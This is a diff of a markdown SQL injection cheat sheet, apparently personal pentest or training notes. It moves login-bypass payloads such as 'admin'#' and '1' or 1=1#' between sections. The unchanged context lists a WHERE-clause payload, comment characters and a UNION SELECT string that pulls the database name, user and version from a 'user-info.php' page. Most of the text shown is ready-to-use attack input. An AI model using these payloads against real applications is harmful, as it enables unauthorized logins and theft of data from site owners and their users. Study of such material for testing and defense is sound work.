@@ -20,7 +20,8 @@
 
 ## Exploitation
 - Login Bypass
-  - Username : ```administrator'--```
+  - Username : ```administrator'--``` , ```admin'#``` 
+  - password: ```1' or 1=1#```
 
 - Where cluase : ```' OR 1=1--``` 
 
@@ -75,10 +76,6 @@ IF(0,name,age)
 - Comment: ```/*``` & ```//``` & ```;//``` & ```#``` & ```%23```
 
 ## Exploit
-- Login
-  - username: ```admin'#``` 
-  - password: ```1' or 1=1#``` 
-
 - Data Extracting 
   - Seleting database version, Database, user
     - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
